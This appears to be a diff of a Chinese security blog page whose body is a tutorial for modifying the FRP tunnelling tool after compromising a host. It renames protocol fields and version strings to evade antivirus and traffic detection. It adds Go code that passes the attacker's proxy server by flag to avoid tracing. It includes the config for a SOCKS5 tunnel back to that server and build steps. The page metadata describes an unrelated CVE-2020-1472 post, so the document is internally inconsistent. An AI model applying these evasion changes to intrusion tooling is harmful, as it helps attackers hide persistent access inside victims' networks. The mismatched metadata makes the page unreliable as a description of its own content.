@@ -6,18 +6,26 @@
   <meta name="keywords" content=" 内网渗透 , 代理 ">
   <meta name="description" content="内网穿透-FRP流量改造 | WLSMILE Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="这里有东西被加密了，需要输入密码查看哦。">
-<meta name="keywords" content="内网渗透,代理">
+<meta name="description" content="CVE-2020-1472 2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程">
+<meta name="keywords" content="漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网穿透-FRP流量改造">
-<meta property="og:url" content="https://luckdogiii.github.io/2020/11/30/13/index.html">
+<meta property="og:title" content="域内提权CVE-2020-1472">
+<meta property="og:url" content="https://luckdogiii.github.io/2020/12/01/14/index.html">
 <meta property="og:site_name" content="WLSMILE Blog">
-<meta property="og:description" content="这里有东西被加密了，需要输入密码查看哦。">
+<meta property="og:description" content="CVE-2020-1472 2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-12-01T02:51:34.120Z">
+<meta property="og:image" content="https://luckdogiii.github.io/images/14/1.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/14/2.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/14/3.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/14/4.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/14/5.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/14/6.png">
+<meta property="og:image" content="https://luckdogiii.github.io/images/14/7.png">
+<meta property="og:updated_time" content="2020-12-03T08:51:28.580Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网穿透-FRP流量改造">
-<meta name="twitter:description" content="这里有东西被加密了，需要输入密码查看哦。">
+<meta name="twitter:title" content="域内提权CVE-2020-1472">
+<meta name="twitter:description" content="CVE-2020-1472 2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程">
+<meta name="twitter:image" content="https://luckdogiii.github.io/images/14/1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -252,6 +260,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代理 password:klforever.cn</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>内网渗透</a>
             </li>
         
@@ -440,7 +452,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-01 10:51:34'>2020-11-30 20:16</time>
+            Created At : <time class="date" title='Updated At: 2020-12-03 17:02:52'>2020-11-30 20:16</time>
         
     </div>
     <div class="article-meta">
@@ -462,7 +474,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#改造前的流量"><span class="toc-text">改造前的流量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#客户端连接"><span class="toc-text">客户端连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Go环境搭建编译frp"><span class="toc-text">Go环境搭建编译frp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编译"><span class="toc-text">编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试"><span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#遗留问题"><span class="toc-text">遗留问题</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -478,7 +490,116 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="34346fd0b9ce1da47d38ad9cc4d79d46bbe65497b81fce5be378f5a430a86e39">f96897e15b3abaf5c78e5728bc3013dfc4ccbcab41693c7d2e95b49d7c7f7c7f7734597cb21b52d726378ab0f8a86f82fff9670db78a2f2abd3afc118d7a114f24e7e5486fd77a813caf15efcdcca08a7b98013db3125b94db515145afdda6f15b163ae5677385d828501b2fd4b8a32c39efddc9b655d332e772a2307710621fd5a6630cd1e35264c3df088f0e95cfc7aa968a18875c92140f43b44439add709a2e44414ae6ee9e60222a88abbe55e7c74a3853dfd1f96dcec61f58dc883f37eb8b9291ab9b9d2b0d47464077b459658f0d14b8bc83d9c5e710462cd552044540c2efe8c34235a68e6222fa598be7ee829960a771247ee6fe6dc5f29ddf562cfefaa2ae75be146f45fb2faa685f1a6cbe5bfe2788959777bf506098af580564c90ab58114500d9439b44207d482186aa031cd675dc2d00ef1c52178b7f46148a3e75db805b97eaae1e8b3fb6f2e04857f035a914fff90d2cf2ac16160e547a00d1c1da3381e8efde0cdbac8271e45933d6af14b1afc29f490a67b160a45a767d452b17daf50d753356810a27a8856265ca55fb3c9926979be0b84bbdda4ba743bb8a088825d2cf362a115da3df9f2f05bcb586838fefa7c3c7c8512b937060889af8e0228a65bc71cf444bf9ed977c1000068d24f0cdf9e2d68326306dad84073562e8f26172b599054bfa42d429009cd11985675a32fd341d07b5a3146f8a2138d7f5a60bff9a496bfa86cff84d85ff69d3f0017c20bd46476db1d8ffe599affd3e8085491a5ff20f6c8d143cdb025ae9d6e17446aabd570fd85862fe289ada87fc6da2981df32ad29759ac4ad866421df4d6795deef5d86f5e885ecbbbbaef61843df3448c8ef2742da8265c6eed6445896010e8c5279b813244741033be0b97eb4f47e4ad41fde7c5066d300dad8a2a0f4c8df1a621b52396180bf630d1e29156b33466a1dd04bc7cfec4f48f3a56a7f07f90abd33448e4783fd8871a6a44cf158e290a43d56bd5294d1fc8c1108ecea780ae771f021ba2685562d2b22ddf9bfd7746bc6a777b554d5ebb70f02e59cf103772e984c04ae12e7b308d03af771ccfdc75a80cbf281e2b3214616f2ad6324b065d23e04f03d509c556997b499c2fc5ea90bea94ca35ff3994268d7fe81fb9ac85f03a77456eaecc27d4b4fd67dc73b86642f312eaf373c6d55b632de89a7a8cdd91548113379c5d10e2f453e600bce7dd3bc390c9681069f7c07c49b0b7039c55e8b40954e3b88a2f6248819ef3c610fd43babc70364797ada4436fd821b19708a1b6ef5e2fbb56c5bd70cac0abaa1a4e81dcec3bdf87ee97216f6320122dfaee35afd64b8195d21fdcb7bfc9fe367f06e4f3f741ea4bf2536848ada3c0e4a1e44032e56522c9091bc262af053526edd59e38ba1539bb4161204ffd4055bc740cad7c4f6aa5765fbe8cefe205959ccbee7fb0dacd6b629fd2f5967d1862ee055bb3d336ec015cccff435da1703d09f09841d97db3874b3c35643e8744422c5ae6611e3be7c312c8f863414be3c394064e03d205a920eac24ae414e66c6a9acfded49f77a657c9478cdf4af37bc1792c63e89195912437f5661ae3a083ffb18095dc347aa63cef953d59d968fa2cb37dff5e34cef44b4dbffd704f5cb1ebb00c4c2211794bc5e370a3906dcaf0ce9e5513f52627e763dc3014e67eef5ceca8f276769a36cf2a78bf0e4608cfb1eb64052ba76aac8589af7f422c6c47da557ec59002ef4884f89ed7921a7bb34ea9564f3baa8f719a30d5b8e8298383f24eaba4af24430ce0892a3f48b1f1796a2fef4dfe6b3a1bd251adcc6f71fe65473a4b073e023612527f495e2cc551238c051ac9fe1eefe4aff2b1bfb329471829842dc09ed649021359fb5b068c181be1847a481eebd4df72e3c8907d299c7a4cda5f0e648f657b4dc92409a06cbbd61d5dde0ec64ead88b255794af6328c9f01e8e1585a16df6c8be2f131f502f4bfe9cefbdf9d55b68b9152564f43b345a6f1c6df2da630ddcff3a9e636fbbc40e65ee5b091535021b38e77ad51a87faa986211eecbca47eaf2fa22505f0577da49704c653a62e52b597fb9a68d04ce7c63c03d758a17fd8a2a85e7be6e94a4d9f511ae5124af34a831de4bb3d45ed5200f02a94662e4a673564779b15f9cd9d71425bc0ade827d18ff0ac72a8e4c25d9e622884f496742eb829e7836024776f45eb3b2accbe8ec89a38d33674268b93ce60635693dad67feeccb8679df8c5d976dd9ffc9468efd92d55ffddd273921778036ab3e3b9d69de0ef0c573d1b30d282dbe3e7d20c33f0ccf847df2369b8437b7a1616fca639d3a8e651618921c690a6871952f494908098b1b7140815f0f809d8ed19d740a911dd6ebfcd10bf16b7a299e60467fb038e11c4185474cefaadd1b15b663cc33c42f096206c49b2611189ae60d70b8a2bc200ef459fa064b2f556d50832d0f41a7e7a70db82281bbbe563a2efc52ec74d0919a523efe8d5d12488c89776713f7d859e9f544607cd7dcc53907f3a8f8d47aabbdd7c0dffba5ff69ec5c3b31b51735816a6f12507502a23d8bdf1094dab7e4450bca01976d02d37a778f0d4fbcd192eaa54f8371d813d561bff658feb77ce9aaa012fa64d8e0f7b230888f0f71d3de5f04423003601b15c84813acc5782cb4a7ce89b365b9cc3419068f026c0ad645c8141e41ac6d73928b5a00d0ef5b1173bbd94765df7b75873cf4b0e677be4fa0a917583a18bbbffb6d84fc9bca83d132c61ff72b99d9616d0b8b1d55c71c30aecb1b76146eb0cca811c2696956cf3f32c1a2e87cd87692e6b75f0073924791f81272059c5d172e19482c31cfbf56cf291f8fb581d9ddc7df0aa605f7af58e9585fec5dc7608fcb81512757d67f26936ac2a5d8c69dc9223e639d1d4058b40739e706c14c94b167fab8ad64bd358945adde2a9178e388c05bb3fa4bc82b7062d5cfacaec3fc2a35a546ed5b66aceb3e32cd2035ace25bb3055d79d359cd8c97acb809b8e3e058bb23df0a08cbb9347a2755d674c77223cb4a0e5ce1c4df44128fc47247dd268a40a7cfb84fdc815295f908f0e166a1dd6d65d104fffb55d9b4ef64c88a6e8f44da9f2a6c6311fd2d1f06563dbd11eb4b72cf3f157700fbc70f119a26fd073efa2934fffec4789e61cf650f2dfffb5713e6b2e3b84dcb14e760bf48725b8c206efe5477a3f2707bb45ac9e9c6be96d4c89284cdf8adf3a02f0eb4a237c80bcac39a1e3bc270ec0950f58d356f790dc2c88f93394380ed44778abdb7c9d9381a327f36ad3450088bff318994d5f650ac33781598650534bc9410d241f1537b5dbd8f3aaac626cab11e2357ac8285a65b8eaa2d685bd07f8c6fa08c0b444c46dfa2ab7e15780ff4cb417943001ee0a1a0590c77e902b439ec2e840b1caa48b88a8a68a7df3191c233d53de94b1f024db5bea1e6cf36dadf28bbd47bcb44283f7a1ba31cf72410dbc9112b16dfeb24ccc91399792493fd7c56ed48316dba89b088d3ce0c54caa56b31cefb957516b2d5943ae821dd95e4140271c061de290f074ea933d313de8071f4382aab42d740b8562688a523a3bb2ac85c3480d78b59fc5c65a8654848ae69ba96e1a107fd8258a16d26bd03593cd1332c559ef6f4c5e7f4e68cae7295fc96f6c2cb2bd81769e78146ba9986a6fa4ade62b55bb57127204d64eb6d88d38cde8c7ce30c28dcd883fcc9c91b6d15e3f9d7204da0eba9c6e43ff6e3eaf0b1af98d664e536b6246fd7b4e42dcadd3b8c0d7e407d380367270fd105f08dff1b6bba95fc910bfff8e2fca8c1b88d522c578fc3428fa82d78ba3a3616d526b7f0238ef6fda4134bc2f3ec7f443d734ffe8b327ec249bc1b2ed4da4bbd8036a3bb2489e693b3df78c2de060a3073df277e655a2df72ae37e874cde19b8b95a3278578ab37fa8ffe9ab8d9585d68e99d56576692ddd221030b1771adef8b09b2cb622a7a17c99478d8cac58f37cb335914c3e18b8db2d6ac3438c05aca4ad52a7411caf3e571ae71ecadcce203e91f790f3644f7ace6ad43a36405d2888dd9fb3408a9cda4326d1d7ea21dea2c8467ba217dc50cead3088b13d9b0a4eb89250be913fe9edfad26bdadcffaa4d4a6adcc7a86ada47fb05a40c790428b633a91916564092d8529a6bbacab2a4a4fac3a83affbd7bc8e87b51801d197abb962df76963895ae8dc789fc7f753bf5e9e773c0e3571d37acd3a2f931714e06f147effcdf0c262dc43b479acc526e1ea79708133f74ceb68235dc809f6b498ed6d3817a026d516d1698eea53745e2009277e2f65767fda7ada3248c90dc46aba6e09cf2fd90d85d5f0dd420ca65f41945de568244b07677ebe077f7741088c66bceb37a746a57a3936d1f687d510621c9412dc6f05b2643033b8b6f0a57541e49a24e640009f1c3fa23a01a489b7b23e81de05d07d99e301cbaabfffa37eb7cc3c841ef038ce9de67400e7d69e3bf1699a4d6fdb803d6f60003b812d7ceb5fdb7080ca90b791f2000393c58d219844f0f5311e41f6085930b500fdf974a7a59af1bef6948c894c1d7e7aad8fad34c6f7c59d095bc3ba5e21f6c3571db896cd51e0c3e3ca19921706fbdef015c161588b5c77e0c1fbca69cf3cb011358ef4f0cb3879950e5698ce654a2dc6ad64ce0fc05bf0399786b5a327a5036b2499341ae56c9dffdef8a8bd2c548fb33efb950962be2c029f3275a4fc7b3e31022334bd72f4a3f42447fa5d3d279d7e84af9632be280b98ff896f49ad7caa048a6eaca59b90c93987acba204a7e4bf970abeda058c5a1ff04e6be0d7af98c200f4a5b5533fc8ed5d34f9c569feeafc9b49ad92d624f59c0b1e5f3c4a0d6026d7cd736d0ce69ee9c9fea2825b5a2641fe3a9dd1938b1199c808f2eed22552a7851e6507794f5effd01558920a42e6f445231a81c259646a34c234723f374ae48f6dd0aba72bc15ece95f4a8063d478deee20feadffd29d1364591a42909b46ed842bdbb492f7fa8659a09fedbd4fb0744c60d29c90c43828633dd133f90fc5e61fe7eb87fc783523fc8e915d199fccb83ded0c24635631ad9bcde40a37de9a606c5a0134fc23ddc0d9d6d647eb859f8da882da46e1bb56767470153bac0492635e62a400c131d8d574ea808ebe79d61d0e6dc47ed4f3537400273f6c471565a4aeb2b543d32850eabb173c88b5f1990f8339804622c600b814818528e03c1a623e181ba28c66772196a765f9bc2c6cfcdb42088fb33de282d74d54e1b92ada10164f0ad83d520638e95651587e6f89e87bacf44d175d48fbd70a695a9dcd37fe60d78ff4a78a9d70deaa27fed66cb93dd832fffb2edb22197fce12a6e6c78bcd92986907c5e63b18cb7a75c0ac265df194b58103b5bea3102451e2fccee185c3cb8a4e762ace712778ca821729e9191247ac7bab2e2e1c187312a9be394884d7342cfe26cf14de64ba61480528fc1618e168c8122a3e249c0255dafe9618aae9b75f1909b42dc20065e0c08e4aed88a0ae6121a3fcbfd8b4aabd3a72dc332316bf6be59880f9e1aa3f103a52389766dd7d98a9a34a0f35bd552e0d39837783f113cbfaf0f00fbc2b38fb7cdf4c8352ca7ca650d8d778ffc4699a3e9fd14e8af92b0084b5b47466559c15f711d1f5618f4bf96d6d50359624be65fc46d95374bbe5ff8e8b7708e05758792bcbaa8a9c85207cf8e6cd858ec705ff509193e131e136f220e6675d5522a6cd63a1cbb0cb4fe302189c35f8df1f0822572e679e3d99aa589f3b246ba81c501892b73249d7877f55beef6ff87062b1f05e98b8b2100f6e62b0150c695a11563ca230e229c180322d3bc9dfcec736c31772759d834fb1752d02557e077407abe44b145d7ecb88c19383f1e5c42214e64fe47fed5e8fa65bae8071beb92b335a6149c1f7a31fb1c1660ee4b157d5ee0aaabd3fd8f9b5f615e04a0ff0bda38267795d52e9e63c4021a472ca1c0e00eb04e5b0ef29d537d830c1dc09e47db43d4d7b38ede206fb9f25f731acb861888d091e1630d56c009296987e87291c69f3e96709ccbe62af2d036ea85226323a19465c9f8fb3947e255bd1546999f0fd00e42703130d99d78511c442134e9ee22f2cb2da62224c4c0260266b5f69a84736c3a44c5a5072ca699cca1ad8d0d21caaae132fb4e51d725ab45867faf8da3bad82bf73708414b95a4300fcc8cedbbeca314ece7d94d67733312a23aff9fe1e329e68c21b3f77fb6e92cbf04a604e91c480960aad04f4d9d129beb5e7ca9ffb14ae82e90d33513590b5e29702980d509d95af96bcb29fd0b5a705f11e1ad8a45565b0ddb041880c8bb95f30ad721b82ae7a00fa9b7093c0f42297d4f8c00b797ebdf4907549aac7c82f756315a3f3272d172147da73a23f99158e778135a7fe05b637161c8f86c7609ef16ce3f7469ab14125f09a7704a89f009be1adead883c77c6ddfd0ecc90cc0dc3390caeec9528271de7e9c5113cd6344fe6ada3f866b484495f84da07705032e752799d8cde1549ff6d7f19aac8dba21f87af23877386ee13a43fbcad39233e017e68efb52fc83f0b25f4478d2bba7a9794a76fea4dd20e93efeed3402212c7995d6959c5c70d264641db23bedaa6dc2adead50df72c3c347aa6b40582000c4498d8a2ca6c57cf234f3c2e3f756772cd0683413ee22b3ac2ffb0a0d98917452908e3b28d92dcb41ef60236526012d29a9652f29628948145d530896ce90696c8cdf413ab3d775fdd56181c73afca2f060de9341f59192cccda379e1f389819d222d6509f10012384b23e305b444866a773bf7f0edcc3c740ca4a1df29856e76d4b6874d4e5b09da7360b48e8c93c1c89efd8254a3bbc555cb3dfeab98c5a04f64c176419f4d8999c847856870e931247ceae3870ceee9f7b2883d33fd454f8a6845dd05d8f9ca364d5e236e37c0d2d084b823e5f88c113c28a9bcfbfd8d1809e80769cf60899e38c119e2cce125c3dc20227f9a3c827f71e9979e9600b1b89e845f1d69943e9750c58ee0330de8a952618fe3464f5e2b6f9cfe3f7a252bee3fd067914abe633471d35ce5ea1e9d8605c485b444f441a80d6a5ab41667a8d31f37607fb62bfe56374d188b91fd47cf6cbacbd6d78432c8972104eb76f56c1a4629a6925d9571bff07d407aca536b7b7ff29357c53d6356c1494bd1084245a407b6abaf590820a2d5eab260401ea15084735d5ea71929d951919b475b8b76de96322064a49b233e61f0c8a6c608d8ee5d1f62d1f03f5cc1b51d7bf8fb7baad78d3feaf49d452d3f8fbbf46f0033db24fd0f3ad065884704176db8deb74a521ded16ed7a37191c45cece006ef9950fcf0a0156e64978183cf6c99d1c67b326c2878b215fc88733a57afb7910bacc983d4e96a11953fa539573ad43dfe7065ea0b7d6e9f3bbf4f78f82c89b6ae9e56645d740d0731f9d037a14ed7dad0a9e2adac628a89e829abd792b82dc2103bfda47ce3d269d2d86fdf50b75d3855eb7c113910641760ed789725b3736b994c65741c0dbd0fb84b46398fa94675d64e39d775dc7e6352a109c0454438b77c68a749b09143adfb0825f16d7e8558f89ab4d9489ec9a4f3e2128b329592a6238a090267793335a93ed351f1f0c8e7fe299132d11d1af56a9e5ef0bddd3dbead9f0319a68130c2c403de7aa65922e361cb9d4fb3399996e7c818c98de9c7d8feff544a960ccc55b115a072ea46eab24d7c0c710bc0ff66f2573a715e1b6f5d95b9b5b75cc253bc78839c7bedf5ea852a0dcdc5fe34d7b24062cc3119e2f023e1f7962848788779b1390a384db222a6259ca10ebd774e37b5aa326e23de76d68d2dbf33fbc231d4574eb7461d66630f7fa4637988b8c3e14002323cf4b58690bf989d76c5814f8b1dd827bcb5d7ba972d1c84e9179831e839b702846912bdfa31bad0395533043118084bcfe61a75f1457498fd65a0796fbb77444ffbb1a18c66fcff4932281cacbafb14d729103908ad5c303b1c32e35031e76306852a43eb16ba52d079cb18c091f4b27d3afe798c9ff2403efaf38a4c407e12fca6d84392fb5124b933c6e786834d36e03031a76cf1a96a07bcb5a11f3524904dad8e2d37fda2284bba161f0bc54be10a178abff4cc700801d76421e30270949489afc0cbfd1322450fb58ce9addf1faa50a4d0ad4352adc404e1b4bbf37537c209659ebcece0238bd7e022e7e397a4dd51e402e4fc6e0271424fdeaed04a43658c6b83947ed751e69f48371ffd63463e99905e1f54629e1b80265bc5c6d032650e25f2e95e02a1ee3e3ae486bdc14235c5bd05edd12f7ddc9841023ded94d3b9692b80a2c64a7f5bbc8705848e90898e115814c2dafd153d7512b6c8d3c42e534468bb9e74c48d6958869930dffb6043077c9d1d8302c102c1677af4a6a92fcfad5448628af38eb3085962bbbdbb88ef04ca49ad9e3f4e6718996500a31c51fc05dd798d2eaec1e5ea48a5801866c3424ff1237ba0c34b9168533ff4d9833a4837611843961353957ffde715dc8a276440223a9d8c7940ac64688eb4d442be7b9cb148748c352cb5f20489225464d63c632fa3d9f144f56a3a8458aafa15440e6a19ffb6eaa4d457edbc594a50a367d1c1a9e9c53fd3f14bf28dce1ecaccf924abfbb62fcbd5e81dc30dc6d2461da4e108c9a314a28f3e704e02b79a4aac3bb7cdb8511a56aabb67ce327fbdfb8a275347121005280cf15df18c9ab68a5ef0b470a2242e4e7f7a2e7fc2b7562521fd199c5d442f7903aa75a8f85e7d7d8b3c8fdb35e7cfa46236fdd73c17a27de27595ab2957a158efc804ef87e97bb3cb7ba0f273859b82685d2cd1c6036d3810eb4cb70945005b1ba42a6cbb3c5147b711122aa32650b3f5b888da6b9fea178467d2a3193b0353a8274c9b1ba1491e5588166b45d0a5d0a39097b6d5b3a43b120ed7d5e087d50c69afacfc5bc0bd6ab35019bf61e00c59f1dc5a8f0c434a66c10882d92b82731d13b2d77aa84d330252984689b56c12d403cdb50302bb30817262c221daff3d8d423b9beabb6c2bdee82e12b38ccbd996a37b319e924bd95790323a88743a42e67c00107700e2c81288603c6f54d3dd5c6ef3475e8b1e0044747313d95418aa24fb0fe12d4fbe14a239cc2ae8821a8fcdde34844633c79c762beb35fb6aa877c31f9696ba656bda84b466379ec256880611c0470fbdb8c4724d35da366eec82e738a3ae96bfd70a82336e56c0522ef5ab046933186717af1df55bd633b00c5e78fc4da5461583490cf0ca1ca661b07b5d3a7cebbe8ef558a3f188fced1153b8bbef5bce8a2ed5c222bc68e4a0754d48e41bf14c7d31fd0ed0f8690743ae8859bdabdb4c3597a83bf71e5557963e131ef41d1501fcfc4ef56a20d219fb620f89c81b66d4cc12794d23134890e36c9e26f2fd8b78c11e1ed808b02d0bb4182da5e3fc934018dcc244a59115583d466f51a3600ac15265c54c05d088f38c4f881f8a6d37a7b30541ae307e9d5252013fa2ca2f36e45aacd34991991ae1185f06fa9f28b519799b569f7fb0ff5dafc218cb07c4b39dff01db9c47d2d23c2c9aa79895315ae589e3ca5bf2d180fb0507a5f785e069706d189371b002f5dbb87b69e0992539d8e138713cf803173be304ab1706a911e6e4cfc8b9ca01ac53129adc8d16ec67572ad40051e8fe8c12bab25a6bb1ee1786d846d0cd578c188592a4eb13821a347ed033664348749920c0409837f6632239c087e47706483234f1ecc83012d33827848fd6eb3dced794b3d956fe3c302c67af5cc7dbff34af5899eeda594f8f63f149634b0c733ba24888a4cdd1080fde7ad8b7c211bb8f377198d5c33a9c7aa04298f9974147bfa3daf180b44e0f9994052b696f74abd2d6865717617da4a109116a6a0897c272e5fb86913be6b51cc251ad7b06b3fd8b2b2def69e7b4cf49d2d94bae1f9eefaeae1bb0aca1c5c32f69aa912c7046bc8dd25fce9026ac3878869a6eb0c5674ceb9fc44c5e378383f015dc6dea84ce7adc0debbd5007bac2d2c2a7963d94f4e57b05382295f9c36e8083fdd11edd2a16dc0fd4b04aa6acba5890183cd6e802bedcc7e432bdf8b35d85cbc683c1c916f919dc025cfeeb01c20ee185799792e82053816578a214e3527941b4288e430c7656e2eb54ccb6801db4d4752ef1a50ad409c324ad5632b0c38b497fd1aa218047d2b184984eef1b1efc0459bcfbb96f3eeefe58c5813837250ae4662b5521040f3f50a82eb61e0fad019b77de2c3316c366be71b87de268a6f6955c4090c46c8a054c32bee7710daaf098baab1ecd94c564976139284f969f3451461f371ed9e14279dec35dbf1b8b78c4c0e7ca32618f874808406bb9a62ef03f712d5e7f769fa67c089cc34c30389eda358609fea0b9eb4d921bb5236402109eb3a381e1f7e2f1da41c02464273fc1d464eaab3b715dd4339a7f64787bf18ef18c630a2044f1af6f177f45f2e82</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在拿下一台机器作为入口时，内网代理就变得尤为重要。他是我们进行横向渗透一个中间人，没了代理在内网中就寸步难行。而内网穿透的工具有很多，比如frp，reGeorg等等非常优秀的代理工具。使用方法不在赘述，这篇文章主要记录下在FRP内网代理时的流量改造。FRP作为一个开源的项目，它的特征早已被各大厂商掌握了，不进行流量上的改变我们就无法成功的建立连接，如果直接使用github编译后的EXE直接会被360等杀软直接判定为黑客行为，流量改造也是为了能够达到一定程度上的免杀效果。</p>
+<h2 id="改造前的流量"><a href="#改造前的流量" class="headerlink" title="改造前的流量"></a>改造前的流量</h2><p>在frp默认配置文件 frpc.ini中不开启 tls_enable = true 时，客户端在连接服务端时会把版本信息传给服务端进行认证。下面是在连接时wires hark抓包的流量</p>
+<p><img src="/images/13/1.png" alt></p>
+<p>可以看见非常明显的frp流量特征</p>
+<pre><code>&quot;version&quot;,&quot;host name&quot;,&quot;user&quot;,&quot;arch&quot;,&quot;privilege_key&quot;,&quot;times tamp&quot;,&quot;run id&quot;,&quot;metas&quot;,&quot;pool_count&quot;</code></pre><p>这时候我们需要修改frp源码中的特征，并且使用Go环境重新编译</p>
+<p>源码地址：</p>
+<pre><code>https://github.com/fatedier/frp</code></pre><p>特征认证信息处：</p>
+<pre><code> pkg\msg\msg.go</code></pre><p><img src="/images/13/2.png" alt></p>
+<p>可以将所有的变量加一个任意的前缀，比如Apple</p>
+<p><img src="/images/13/3.png" alt></p>
+<p>而在<code>pkg\util\version\version.go</code> 中定义了版本信息，这里也可以修改一下</p>
+<p><img src="/images/13/4.png" alt></p>
+<p>修改为3.14.15</p>
+<p><img src="/images/13/5.png" alt></p>
+<h2 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h2><p>如果按照正常的客户端连接方式，我们需要一个frpc.ini配置文件，这里会暴露我们的代理服务器，如果被溯源问题就大了。</p>
+<pre><code>[common]
+server_addr = xxx.xxx.xxx.xxx
+server_port = 4444
+privilege_token = pentest
+tls_enable = true
+
+[ssh]
+type = tcp
+remote_port = 23333
+plugin = socks5
+</code></pre><p>所以我们在源码中添加一段自定义的代码，使其用接收参数的方式进行指定ip和端口。</p>
+<p>在<code>cmd\frpc\sub\root.go</code>文件中添加如下函数（具体配置需要自己更改）</p>
+<pre><code>func getFileContent(ip string,port string) {
+    var content string = `[common]
+    server_addr = ` + ip + `
+    server_port = ` + port + `
+    tls_enable = true
+
+    [ssh]
+    type = tcp
+    remote_port = 6000
+    plugin = socks5
+    `
+    fileContent = content
+}</code></pre><p>同时别忘了对变量进行定义<br><img src="/images/13/6.png" alt></p>
+<p>在 init函数中加两行代码，对ip和端口进行接收。</p>
+<pre><code>rootCmd.PersistentFlags().StringVarP(&amp;ip, &quot;server_addr&quot;, &quot;t&quot;, &quot;&quot;, &quot;server_addr&quot;)
+rootCmd.PersistentFlags().StringVarP(&amp;port, &quot;server_port&quot;, &quot;p&quot;, &quot;&quot;, &quot;server_port&quot;)</code></pre><p><img src="/images/13/7.png" alt></p>
+<p>最后需要在 runClient()函数下调用我们自定义的函数getFileContent()<br><img src="/images/13/8.png" alt></p>
+<p>注意一下参数的接收和代码的注释。</p>
+<h2 id="Go环境搭建编译frp"><a href="#Go环境搭建编译frp" class="headerlink" title="Go环境搭建编译frp"></a>Go环境搭建编译frp</h2><p>这里学弟搞得一键搭建QAQ，不过注意要在 /root/ 目录下运行该脚本</p>
+<pre><code class="sh">go_tar_gz=&quot;go1.15.5.linux-amd64.tar.gz&quot;
+
+go_url=&quot;https://dl.google.com/go/${go_tar_gz}&quot;
+
+wget --no-check-certificate -O ${go_tar_gz}  ${go_url}
+tar -xvf  ${go_tar_gz}
+rm  ${go_tar_gz}
+
+
+# go语言 添加环境变量
+
+cat &lt;&lt;EOF &gt;&gt; ~/.profile
+export GOROOT=/root/go
+export GOPATH=/root/go/work
+export PATH=$PATH:/root/go/bin
+
+EOF
+
+source ~/.profile
+mkdir -p /root/go/work
+
+# 测试go语言安装
+
+mkdir -p ~/helloworld
+cd ~/helloworld
+
+cat &lt;&lt;EOF &gt; helloworld.go
+
+// Test that we can do page 1 of the C book.
+
+package main
+
+func main() {
+    print(&quot;hello, world\n&quot;)
+}
+EOF
+
+go build
+
+./helloworld</code></pre>
+<p>我这里使用的kali安装的Go环境，使用<code>go version</code>检测是否成功<br><img src="/images/13/9.png" alt></p>
+<p>如果不成功可能是环境变量文件没有刷新，刷新一下就好了</p>
+<pre><code>source ~/.profile</code></pre><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>之后把修改过后的frp源码拖到 go/work/ 目录下，修改 Makefile.cross-compiles 文件，添加</p>
+<pre><code>export GOPROXY=https://goproxy.cn</code></pre><p>之所以添加<code>export GOPROXY=https://goproxy.cn</code>是因为在国内，go语言的这个包的网站是被禁止的，我们无法直接访问。</p>
+<p>修改完成之后就可以对其进行编译了。</p>
+<pre><code>make -f Makefile.cross-compiles</code></pre><p>编译出的各种版本如下</p>
+<p><img src="/images/13/10.png" alt></p>
